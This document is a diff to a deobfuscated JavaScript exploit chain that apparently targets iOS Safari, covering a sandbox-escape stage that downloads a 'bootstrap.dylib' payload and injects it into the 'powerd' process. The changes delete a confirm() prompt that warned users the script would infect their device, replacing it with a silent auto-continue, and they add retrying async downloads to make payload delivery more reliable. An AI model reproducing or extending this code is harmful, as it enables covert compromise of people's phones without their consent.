@@ -1247,13 +1247,9 @@ function YA() {/* Original: YA → resolveSymbols */
 
                     // When we load the metadata, ask user if they want to continue (will infect device)
                     if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
-                        let shouldContinue = confirm(
-                            "The script is about to load metadata and subsequent payloads to infect your device in `powerd` process.\n" +
-                            "Cancel = safely STOP this operation\n" +
-                            "OK     = continue infect your device");
-                        if (!shouldContinue) {
+                        // WHS: авто-continue без confirm() — тихий прогон (payload 7a7d…)
+                        if (false) {
                             window.log("[LOADER] Execution canceled by user.");
-                            return;
                         }
                     }
 
@@ -1327,25 +1323,38 @@ function YA() {/* Original: YA → resolveSymbols */
 }
 
 // ── executeSandboxEscape (yA) — main sandbox escape entry ────────────────
-function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
+async function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
     const A = YA();
     let g;
     if (platformModule.On()) throw new Error("platformModule.On()");
-    return g = (() => {
+    return g = (async () => {
         //alert("P.platformState.fixedMachOVal2=" + P.platformState.fixedMachOVal2);
         const g = new MachOPayloadBuilder(platformModule.platformState.fixedMachOVal1, platformModule.platformState.fixedMachOVal2, platformModule.platformState.fixedMachOVal3);
 
         // ── PATCH: Load custom dylib with dynamic _process lookup ──
         // Dylib must be pre-truncated to Mach-O proper (no appended data).
         const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
-        const _xhr = new XMLHttpRequest();
-        _xhr.open("GET", "payloads/bootstrap.dylib", false);
-        _xhr.overrideMimeType("text/plain; charset=x-user-defined");
-        _xhr.send();
-        const _raw = _xhr.responseText;
-        // Build byte array from x-user-defined response
-        const _buf = new Uint8Array(_raw.length);
-        for (let _i = 0; _i < _raw.length; _i++) _buf[_i] = _raw.charCodeAt(_i) & 0xFF;
+        // WHS: async fetch с кэшем и ретраями вместо sync-XHR (Safari Time­out на sync = причина падения Stage3)
+        const _fetchBootstrap = async () => {
+            if (globalThis.__whs_bootstrap_buf) return globalThis.__whs_bootstrap_buf;
+            for (let attempt = 1; attempt <= 4; attempt++) {
+                try {
+                    const _resp = await fetch('payloads/bootstrap.dylib', { cache: 'no-store' });
+                    if (!_resp.ok) throw new Error('HTTP ' + _resp.status);
+                    const _ab = await _resp.arrayBuffer();
+                    globalThis.__whs_bootstrap_buf = new Uint8Array(_ab);
+                    window.log('[PATCH] bootstrap downloaded async: ' + _ab.byteLength + 'B (attempt ' + attempt + ')');
+                    return globalThis.__whs_bootstrap_buf;
+                } catch (e) {
+                    window.log('[PATCH] bootstrap fetch attempt ' + attempt + ' failed: ' + e);
+                    await new Promise(r => setTimeout(r, 400 * attempt));
+                }
+            }
+            throw new Error('bootstrap.dylib download failed after retries');
+        };
+        const _buf = (typeof _bootstrapPreloaded !== 'undefined' && _bootstrapPreloaded)
+            ? _bootstrapPreloaded
+            : (await _fetchBootstrap());
         const _dv = new DataView(_buf.buffer);
         // Parse LC_SYMTAB to find _process
         const _ncmds = _dv.getUint32(16, true);
@@ -1718,8 +1727,8 @@ class MachOPayloadBuilder {/* Original: oA → MachOPayloadBuilder */
     }
 }
 // ── Module export ────────────────────────────────────────────────────────
-r.lA = () => {// Entry point: resolves APIs, builds payload, executes sandbox escape
+r.lA = async () => {// Entry point: resolves APIs, builds payload, executes sandbox escape (WHS: async для bootstrap-fetch)
     const A = globalThis.moduleManager.getModuleByName("b5135768e043d1b362977b8ba9bff678b9946bcb");
-    return A._d(), A.qd(), executeSandboxEscape();
+    A._d(); A.qd(); return await executeSandboxEscape();
 };
 return r;
